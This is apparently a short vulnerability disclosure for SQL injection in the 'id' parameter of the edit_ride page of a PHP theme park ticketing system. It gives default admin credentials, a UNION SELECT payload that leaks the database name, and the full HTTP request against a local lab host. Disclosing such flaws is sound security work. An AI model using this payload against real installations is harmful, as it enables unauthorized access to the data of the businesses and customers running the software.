# Theme Park Ticketing System v1.0 by oretnom23 has SQL injection

BUG_Author: MaskCity

Login account: admin@admin.com/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/14613/theme-park-ticketing-system-using-phpmysqli-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /tpts/index.php?page=edit_ride,edit_ride.php

Vulnerability location: /tpts/index.php?page=edit_ride&id, id

dbname =tpts_db

[+] Payload: /tpts/index.php?page=edit_ride&id=-1%20union%20select%201,database(),3,4--+ // Leak place ---> id

```sql
GET /tpts/index.php?page=edit_ride&id=-1%20union%20select%201,database(),3,4--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=g29omi7f91g3h7ud1uhq6rbmkv
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/182984233-f4cde321-7f35-4c12-826c-86b1b8e04c0c.png)
